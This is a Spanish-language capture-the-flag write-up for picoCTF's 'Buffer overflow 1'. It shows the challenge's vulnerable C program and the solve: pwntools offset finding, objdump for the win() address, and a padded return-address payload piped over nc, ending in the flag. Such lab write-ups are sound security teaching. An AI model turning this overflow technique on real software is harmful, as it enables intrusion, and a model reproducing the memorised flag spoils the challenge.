# Buffer overflow 1

## Objetivos
Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/250/vuln). You can view source [here](https://artifacts.picoctf.net/c/250/vuln.c). And connect with it using `nc saturn.picoctf.net 63447`


## Solución 
```java
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python3                       
Python 3.10.7 (main, Sep  8 2022, 14:34:29) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'

┌──(kali㉿kali)-[~/Downloads]
└─$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln


┌──(kali㉿kali)-[~/Downloads]
└─$ echo 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf6\x91\x04\x08' | nc saturn.picoctf.net 62439                   



Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_ad2f467b}

```
## Notas adicionales 

Este reto al igual que el anterior, utiliza un buffer y un gets entonces sabiendo esto sabemos por donde podemos empezar para atacar sobrepasando el buffer, el problema es que no sabemos cuantos caracteres tenemos que mandar ; para esto vamos a usar python y las herramientas pwn tools para crear un buffer mayor al de 32 que es el que utiliza el programa 

podemos usar esta función en python para verificar cual es el lugar exacto o los caracteres exatos para el retorno de la bandera, 

```
>>> cyclic_find(0x6161616c)
>>> 44

```

Ahora para nuetro win vamos hacer lo siguiente 

```
┌──(kali㉿kali)-[~/Downloads]
└─$ objdump -D vuln -M intel | grep 'win'        
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>
                                                                                                                               
┌──(kali㉿kali)-[~/Downloads]
└─$ 


>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
>>> 

```